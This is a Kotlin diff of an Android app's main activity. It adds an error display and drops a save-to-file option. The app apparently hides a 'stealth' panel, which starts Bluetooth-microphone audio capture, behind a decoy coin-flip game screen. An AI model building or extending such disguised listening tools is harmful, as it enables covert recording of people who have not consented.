@@ -7,8 +7,6 @@ import android.media.AudioDeviceInfo
 import android.media.AudioManager
 import android.os.Build
 import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
 import android.view.Gravity
 import android.view.View
 import android.view.animation.LinearInterpolator
@@ -20,7 +18,6 @@ import kotlin.random.Random
 class MainActivity : AppCompatActivity() {
     private lateinit var audioManager: AudioManager
     private var isCapturing = false
-    private val handler = Handler(Looper.getMainLooper())
 
     private lateinit var gameLayout: LinearLayout
     private lateinit var settingsLayout: LinearLayout
@@ -28,13 +25,13 @@ class MainActivity : AppCompatActivity() {
     
     private lateinit var coinImage: TextView
     private lateinit var streakText: TextView
+    private lateinit var errorText: TextView // Shows errors on screen!
     private var currentStreak = 0
 
     companion object {
         @Volatile var currentVolume = 0
         @Volatile var currentGain = 10.0f 
-        @Volatile var activeChannel = 0 
-        @Volatile var isRecordingToFile = false
+        @Volatile var errorMessage = "" // Stores crashes
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -56,6 +53,16 @@ class MainActivity : AppCompatActivity() {
         rootLayout.addView(stealthLayout)
         
         setContentView(rootLayout)
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // If the service crashed, show the error here!
+        if (errorMessage.isNotEmpty()) {
+            errorText.text = "SERVICE CRASHED:\n$errorMessage"
+            errorText.visibility = View.VISIBLE
+            errorMessage = "" // clear after showing
+        }
     }
 
     private fun buildGameUI(): LinearLayout {
@@ -104,6 +111,16 @@ class MainActivity : AppCompatActivity() {
             setPadding(0, 0, 0, 50)
         }
 
+        // ERROR MESSAGE DISPLAY
+        errorText = TextView(this).apply {
+            text = ""
+            textSize = 14f
+            setTextColor(android.graphics.Color.RED)
+            gravity = Gravity.CENTER
+            setPadding(20, 20, 20, 20)
+            visibility = View.GONE
+        }
+
         val btnFlip = Button(this).apply {
             text = "FLIP COIN"
             textSize = 20f
@@ -114,6 +131,7 @@ class MainActivity : AppCompatActivity() {
         layout.addView(title)
         layout.addView(coinImage)
         layout.addView(streakText)
+        layout.addView(errorText)
         layout.addView(btnFlip)
         
         return layout
@@ -213,13 +231,9 @@ class MainActivity : AppCompatActivity() {
         val btnPermissions = Button(this).apply {
             text = "1. Grant Permissions"
             setOnClickListener {
-                val perms = mutableListOf(
-                    Manifest.permission.RECORD_AUDIO, 
-                    Manifest.permission.MODIFY_AUDIO_SETTINGS
-                )
+                val perms = mutableListOf(Manifest.permission.RECORD_AUDIO, Manifest.permission.MODIFY_AUDIO_SETTINGS)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) perms.add(Manifest.permission.BLUETOOTH_CONNECT)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) perms.add(Manifest.permission.POST_NOTIFICATIONS)
-                
                 ActivityCompat.requestPermissions(this@MainActivity, perms.toTypedArray(), 1)
             }
         }
@@ -229,7 +243,7 @@ class MainActivity : AppCompatActivity() {
             setOnClickListener {
                 val devices = audioManager.getDevices(AudioManager.GET_DEVICES_INPUTS)
                 val btDevices = devices.filter { it.type == AudioDeviceInfo.TYPE_BLUETOOTH_SCO || it.type == AudioDeviceInfo.TYPE_BLE_HEADSET }
-                Toast.makeText(this@MainActivity, if (btDevices.isEmpty()) "No mics found" else "Mic Found: ${btDevices.first().productName}", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this@MainActivity, if (btDevices.isEmpty()) "No mics found" else "Mic: ${btDevices.first().productName}", Toast.LENGTH_SHORT).show()
             }
         }
 
@@ -247,32 +261,19 @@ class MainActivity : AppCompatActivity() {
             })
         }
 
-        val checkRecord = CheckBox(this).apply {
-            text = "Save Audio to File"
-            setOnCheckedChangeListener { _, isChecked -> isRecordingToFile = isChecked }
-        }
-
         val btnStart = Button(this).apply {
             text = "START LISTENING"
             setOnClickListener {
-                try {
-                    val intent = Intent(this@MainActivity, AudioCaptureService::class.java)
-                    if (!isCapturing) {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                            startForegroundService(intent)
-                        } else {
-                            startService(intent)
-                        }
-                        isCapturing = true
-                        stealthLayout.visibility = View.GONE
-                        gameLayout.visibility = View.VISIBLE
-                    } else {
-                        stopService(intent)
-                        isCapturing = false
-                        this.text = "START LISTENING"
-                    }
-                } catch (e: Exception) {
-                    Toast.makeText(this@MainActivity, "CRASH PREVENTED: ${e.message}", Toast.LENGTH_LONG).show()
+                val intent = Intent(this@MainActivity, AudioCaptureService::class.java)
+                if (!isCapturing) {
+                    startForegroundService(intent)
+                    isCapturing = true
+                    stealthLayout.visibility = View.GONE
+                    gameLayout.visibility = View.VISIBLE
+                } else {
+                    stopService(intent)
+                    isCapturing = false
+                    this.text = "START LISTENING"
                 }
             }
         }
@@ -289,7 +290,6 @@ class MainActivity : AppCompatActivity() {
         layout.addView(btnScan)
         layout.addView(gainText)
         layout.addView(seekBar)
-        layout.addView(checkRecord)
         layout.addView(btnStart)
         layout.addView(btnBack)
         
